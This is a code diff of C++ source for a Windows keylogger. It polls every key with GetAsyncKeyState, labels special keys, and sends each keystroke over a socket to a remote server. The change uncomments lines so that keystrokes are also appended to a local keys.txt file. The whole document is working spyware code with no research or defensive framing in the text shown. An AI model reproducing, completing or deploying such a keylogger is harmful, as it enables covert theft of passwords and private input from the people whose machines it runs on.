@@ -17,7 +17,7 @@ void sendMsg(SOCKET client_socket, const char *msg);
 void closeSocket(SOCKET client_socket);
 
 int main(){
-    // ofstream keys("keys.txt", ios::trunc); // clear the keys.txt file everytime this code is run
+    ofstream keys("keys.txt", ios::trunc); // clear the keys.txt file everytime this code is run
     
     SOCKET client_socket;
     struct sockaddr_in serv_addr;
@@ -39,43 +39,43 @@ void startLogging(struct sockaddr_in *serv_addr, SOCKET client_socket, const cha
         for (c = 0; c < 255; c++){
             bool pressed = GetAsyncKeyState(c) & 0x1;
             if (pressed){
-                // ofstream keys;
-                // keys.open("keys.txt", ios::app);
+                ofstream keys;
+                keys.open("keys.txt", ios::app);
                 const char* text;
                 switch (c) {
                     case VK_BACK:
                         text = "[backspace]";
-                        // keys << "[backspace]";
+                        keys << "[backspace]";
                         sendMsg(client_socket, text);
                         break;
                     case VK_RETURN:
                         text = "[enter]";
-                        // keys << "[enter]";
+                        keys << "[enter]";
                         sendMsg(client_socket, text);
                         break;
                     case VK_SHIFT:
                         text = "[shift]";
-                        // keys << "[shift]";
+                        keys << "[shift]";
                         sendMsg(client_socket, text);
                         break;
                     case VK_CONTROL:
                         text = "[ctrl]";
-                        // keys << "[ctrl]";
+                        keys << "[ctrl]";
                         sendMsg(client_socket, text);
                         break;
                     case VK_CAPITAL:
                         text = "[caps]";
-                        // keys << "[caps]";
+                        keys << "[caps]";
                         sendMsg(client_socket, text);
                         break;
                     case VK_TAB:
                         text = "[tab]";
-                        // keys << "[tab]";
+                        keys << "[tab]";
                         sendMsg(client_socket, text);
                         break;
                     case VK_MENU:
                         text = "[alt]";
-                        // keys << "[alt]";
+                        keys << "[alt]";
                         sendMsg(client_socket, text);
                         break;
                     case VK_LBUTTON:
@@ -85,7 +85,7 @@ void startLogging(struct sockaddr_in *serv_addr, SOCKET client_socket, const cha
                     default:
                         char str[2] = {c, '\0'};
                         text = str;
-                        // keys << c;   
+                        keys << c;   
                         sendMsg(client_socket, text);
                 }
                 
